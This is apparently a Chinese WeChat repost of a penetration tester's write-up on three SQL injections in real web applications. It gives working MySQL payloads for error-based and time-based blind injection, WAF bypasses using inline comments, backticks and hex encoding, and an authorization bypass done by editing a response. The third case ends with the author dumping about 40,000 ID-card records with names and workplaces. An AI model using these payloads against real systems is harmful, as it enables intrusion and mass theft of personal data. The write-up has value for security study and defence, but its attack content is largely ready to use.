> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247513078&idx=1&sn=93ec1a841a55f8a71bb5dc046ff1011e

#  这个SQL注入有点东西！！！  
薛定谔不喜欢猫  李白你好   2025-07-15 00:00  
  
**免责声明：**  
由于传播、利用本公众号李白你好所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号李白你好及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
文章作者：奇安信攻防社区（  
薛定谔不喜欢猫  
）  
  
文章来源：  
https://forum.butian.net/share/4453  
  
  
**1**  
►  
  
**介绍**  
  
  
SQL注入是渗透中比较常见的漏洞类型，注入方式也是多种多样的，但waf和过滤也是多元的，这次和师傅们分享一下最近遇到的几处SQL注入，分享一下思路和注入方式，如果有理解不正确的地方，求大佬指点。  
  
![SQL注入原理、攻击与防御| 小菜学网络](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqU8zaSkD2gFDuRKfAJKpohy51MXLmo81yVwAmZXFvj19oQQnh7Kp9Fg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**2**  
►  
  
**第一处SQL注入**  
  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqoYGWa0jaEQDGTySO7Hkff56AdmNcvRjnm0MiabOsCicgouiccH3tML8jA/640?wx_fmt=png&from=appmsg "")  
  
是在这里进行查询抓包，然后注入点在日期  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqESF0R5cjXYdiawT8Rtd9KAMnvuhicwRgjd25QplaRf9PlRDmicEPux2EQ/640?wx_fmt=png&from=appmsg "")  
  
可以发现加入一个单引号之后，返回了报错信息，我们对报错信息进行分析一下：  
  
正常是  

```
date_format('2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S')
```

  
  
然后我们添加一个单引号后变成了  

```
date_format('2025-06-19 00:00:00'','%Y-%m-%d %H:%M:%S')
```

  
  
这时候我们第一步要做的是进行闭合，一开始我这里选择的是插入 ')#  
 进行闭合  
  
于是我构造了  

```
2025-06-19 00:00:00') and extractvalue(1,concat(0x0a,(select user()),0x0a))#
```

  
  
但是没成功，后来又想到了date_format()是有两个参数的，于是又构造了  

```
2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and extractvalue(1,concat(0x0a,(select user()),0x0a))#
```

  
  
但还是不对，直接本地调试一下吧  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqHSCte7ziaeBOFu1C28YdnkWtbqOcjUaWU0NqEibM788JxB31OicLgmEjg/640?wx_fmt=png&from=appmsg "")  
  
把完整的语句放进来，然后进行调试，删除不必要的东西。  
  

```
#SELECT COUNT(1) FROM ( SELECT ss FROM patrol_task AS t JOIN sys_user AS u WHERE date_format ( t.start_time,'%Y-%m-%d %H:%M:%S') >= date_format('2025-06-11 00:00:0011111111111','%Y-%m-%d %H:%M:%S') and extractvalue(0x0a,concat(0x0a,database())))TOTAL# AND date_format (t.end_time,'%Y-%m-%d %H:%M:%S') <= date_format('2025-07-21 23:59:59','%Y-%m-%d %H:%M:%S') ORDER BY t.create_date DESC ) TOTAL
```

  
  
最后可以精简到差不多这样，后来经过本地调试之后，发现存在一个问题  
  

```
SELECT COUNT(1) FROM ( select username FROM admin AS t JOIN news AS u WHERE 1=1 and extractvalue(0x0a,concat(0x0a,database())))TOTAL#
```

  
  
这样是可以报错出结果的：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpquiaib9yqgwPC3j5XcuJtsX0rkatWH0SINBqIhQSJEicTcoCg19P8v4OXA/640?wx_fmt=png&from=appmsg "")  
  
也就是说，按理说我闭合后拼接  

```
and extractvalue(0x0a,concat(0x0a,database())))total#
```

  
  
是可以爆出内容的  
  
但是网站就是无法报错，然后观察网站报错信息，发现并不是数据库的那种报错，感觉是网站框架，自定义的报错，可能压根就不会返回报错信息，于是我们尝试使用时间盲注  
  
正常来说我们闭合之后会拼接
```
if(ascii(substr(user(),1,1))>1,sleep(6),0)
```

  
  
我们继续在本地调试：  
  

```
select count(1) from (select username from admin as t join news as u where 1=1 and if(ascii(substr(user(),1,1))>1,sleep(6),0))total#
```

  
  
这是构造完的语句，发现可以延时，但是换到网站中发现并没有达到延时的效果：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqxpI8bv8xdz8seGqmwicKW3ZicYFOiakcBwWnxgHQxJibZaZibuWQxEYNC7g/640?wx_fmt=png&from=appmsg "")  
  
问题出现在条件这里：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpq3u9YVib30SCpboP1EEiaJyA2h92zh3SFALAz69iaf5yOfm2vV3DmoOTag/640?wx_fmt=png&from=appmsg "")  
  
我们的注入点在这里，注入点是起始时间和终止时间  
  
这个where，后面跟着的这个条件，也就是date_format,我们在不知道有没有记录的条件下，是无法保障他是有内容(条件为真)的，就好比1=2一样，这样可能无法执行后面的延迟语句，这就是为什么在本地调试了之后没问题，但是网站还是无法进行延迟的原因。因为我们不清楚前面的判断条件是否为真。  
  
那我们有没有办法，即使前面的条件为假，也可也执行后面的语句呢？  
  
有的兄弟，有的。我们直接使用子查询  
  
这里给各位师傅们再介绍一下子查询：  
  
子查询是在语句中再嵌入一个sql语句，适合从其他表中提取数据或进行复杂条件判断时使用，最内层的语句会被优先执行，会比一些逻辑运算和算数运算的优先级高。  
  
于是我们构造一个时间盲注子查询语句：  

```
#select count(1) from (select username from admin as t join news as u where 1=2 and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#
```

  
  
我们来解析一下这个语句  
  
最内层是
```
if(ascii(substr(user(),1,1)>1,sleep(6),1))
```

  
 是一个常见的时间盲注，截取了user()的首位，进行了ascii编码，如果ascii编码的值大于1，就进行sleep(6)的命令。  
  
外面一层是
```
(select 0 from () x)
```

  
 x是给最内层的语句进行一个赋名  
  
这个语句会让系统优先执行最内层的时间盲注语句，然后判断前面的条件是否为真，这样即使前面是1=2，但是已经执行了内层的时间盲注，造成了延迟，这样就可以进行SQL注入的判断了。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqhibibfeNB8Vzz5vUicBdlwu84qibhWDtTa2ib2oh5YibUxiagpr7ejxsIePSQ/640?wx_fmt=png&from=appmsg "")  
  
所以最终我们的payload为  

```
2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#
```

  
  
达到了一个时间盲注的结果。  
  
  
**3**  
►  
  
**第二处SQL注入**  
  
  
这个SQL注入有非常严格的过滤，基本上常见的函数和常见的绕过函数都被过滤的干干净净了。  
  
首先要进行一个权限绕过：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpq0aEAcKiaB5TvLiaZR0Vm9geiazQp6Okcb5B4EibrQyDg73YpGib43caEsxA/640?wx_fmt=png&from=appmsg "")  
  
有时候直接修改返回包会有意想不到的结果，直接把返回包的false改为true  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqG6nDe0U9icSE5g3icBwUsUqXib1zN2gwIZiboNPTQP7H852fNRoyWwkryQ/640?wx_fmt=png&from=appmsg "")  
  
进来之后，也是一个查询的地方去抓包  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqURBMKRvnkfvlGjymGhp5EqOf7Na2kpxWjwVQGPOmh8kiaodibMSfD1Uw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqiaVGq0sMDvNQfBibXf4L06N2v5dPM47r3SyQZ2rjoibnyicHib9YK2RibECw/640?wx_fmt=png&from=appmsg "")  
  
注入点是ordertype，一个单引号报错，两个单引号正常  
  
但是过滤非常非常严格，常见的几乎没有能用的东西,发现还是时间盲注好用，可以使用benchmark(),话不多说直接上payload，分析一波：  
  

```
orderType=1%20or%20Y(point(56.7,53.34))%20or%20(select/**/0/**/from/**/(select/**/if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!55555555555555555*/benchmark(511111111,1)),1))x)
```

  
  
首先是
```
1 or Y(point(56.7,53.34))
```

  
 这是使用了mysql的Y()函数去获得了Y的坐标，其实就类似于一个恒真的表达式，起到了一些绕过的作用。  
  
/**/ 绕过了空格的过滤  
  
/*!55555*/ 是mysql的内联注释  
  
left(right())的搭配使用可以绕过一些waf，提高复杂度，防止被识别到  
  
数字55555是一个任意大的版本号，当MySQL服务器版本 ≥ 指定版本号时，执行注释中的代码，由于55555不可能达到，实际上总是执行，所以通过这种方式可以绕过user()的识别。  
  
后面的
```
select/\*!55555555555555555\*/benchmark(511111111,1)
```

  
是一个原理，系统监测了select benchmark()，会被拦截，但是使用内联注释之后，就可以绕过识别，从而达到执行语句的结果。  
  
这里依旧是使用了子查询语句，我们分析代码：  

```
1%20or%20Y(point(56.7,53.34))%20or%20(select/**/0/**/from/**/(select/**/if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!55555555555555555*/benchmark(511111111,1)),1))x)
```

  
  
发现使用了两个or，而Y()是恒为真的，但是我们依旧无法判断ordertype=1是否存在，如果不存在的话，那么ordertype=1为假，而Y()为真，我们最后的注入语句就无法实现精准判断，所以我们这里使用子查询语句，就不用考虑ordertype=1的真假性。  
  
系统先执行内层语句，也就是  

```
select if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!5555555555555555555555*/benchmark(51111111,1),1))
```

  
  

```
select 0 from () x
```

  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqhWTbZiaKiaw18PjSXWWATYG2OUibNxLhhYNFPxia1WoNEcRh5TiadkW8agQ/640?wx_fmt=png&from=appmsg "")  
  
达到了一个时间盲注的目的。  
  
  
**4**  
►  
  
**第三处SQL注入**  
  
  
这是一个拿身份证查信息的接口，tj是注入点，加一个单引号可以看到进行报错。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqORqKgqs0d32jvfQBZU6h4hCCQEibeHicL2mcel5ibF9Gqrk1IPJhGruxw/640?wx_fmt=png&from=appmsg "")  
  
  
多加几个单引号，分析一下。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqRx1CN7I0QLl0O3iaG4biazxY36f8EVsccgYcADiccsib34gdt0Fxje9W3Q/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到原本的逻辑应该是 sfzh='123123' and xm='12331'，这里的123123是我随便输入的身份证号,12331是我随意输入的姓名。  
  
于是构造闭合，直接让
```
tj=sfzh=1#
```

  
,这样进行闭合，这样就变成了 
```
sfzh=1 and (注入语句) #
```

  
 然后这里and or 被过滤了，我选择使用 || 来代替，发现 
```
|| 1=1#
```

  
 会爆502，而 
```
|| 1=2#
```

  
 会出现内容  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqYISyEk95oBXaoueIgkW3ZGtXDLZhLfdaDr9mXLHVVg5eqplUSc6yNA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpq4dia2D5EFmTtiaib05j5I1iaYb1VyxacT5k2rjWZORo52icd5SskgiacDbYA/640?wx_fmt=png&from=appmsg "")  
  
然后因为有报错信息，所以尝试报错注入  
  
发现extractvalue()，floor(),updatexml(),exp()什么的都被过滤了，然后使用 ` 反引号绕过。  
  

```
extractvalue
```

  
(1,
```
concat
```

  
(0x0a,
```
version
```

  
()))#  
  
也就是这样去绕过，concat()也被过滤了，直接也这样绕过。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqoFh7C7RAxTLGdJ1cKqj1ics3ZOv0aSxt0a5MonpbmPjC5MMPhZXLPLw/640?wx_fmt=png&from=appmsg "")  
  
成功报错注入了，后来想证明数据库是什么权限的时候，发现user()也被过滤了，但是user()是没有办法使用` 反引号去隔开绕过的，常见的方法也过滤了不少，我这里选择使用current_user去替换  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqaVCGuBibKVUdFwfFBh6oicO9ibvwwnkEPuTRjIujYCv4WKWwya1sKo4CQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到是成功报错了。  
  
因为是使用身份证去查询的接口，想着可以查询一下有没有敏感信息，可以发现现在是已经在sfzh这个表里了，我们去查sfzh这个字段，就相对来说比较容易，我们可以使用like去进行模糊查询，比如 
```
sfzh like '1%'
```

  
  
like是一个模糊匹配的作用，而'1%'，是需要用单引号括起来的，我们这样的目的是模糊匹配sfzh这个字段，1开头的信息，也就是查询身份证号是1开头的个人信息。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpq8qQbFCViccdMO3VK5jIoPBPlVAviaEQ6slxTsjUwhhIE8rEuULaayLjg/640?wx_fmt=png&from=appmsg "")  
  
但是并没有如愿的出现内容，观察报错信息，发现单引号被转义了，这里我们使用16进制编码绕过。  
  
'2%'为0x3225  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAH1m5FBRwSYBjAbhmpROpqXViargK364kAaBsYQVSUB9DxDcYK4rY0PSNWmuAdIKL11ccm04AZZOQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到匹配到了非常多的信息，身份证、姓名、单位、学校、等数据，然后继续匹配其他身份证开头数字，共计约4w+条身份证  
  
以上是最近在测试中遇到的较为有意思的SQL注入，希望对各位师傅们有帮助，以上是我的一些理解，如果有错误的地方，希望大佬指正。  
  
  
**5**  
►  
  
**网络安全情报攻防站**  
  
www.libaisec.com  
  
综合性的技术交流与资源共享社区   
  
专注于红蓝对抗、攻防渗透、威胁情报、数据泄露  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBqqTgZBmhG9EyNEtQuWs2Y9FxMsHeZpWcKr5gnRbywufXA048Ov7iat8gPzx3gxjKwZFMR7Y05RCA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
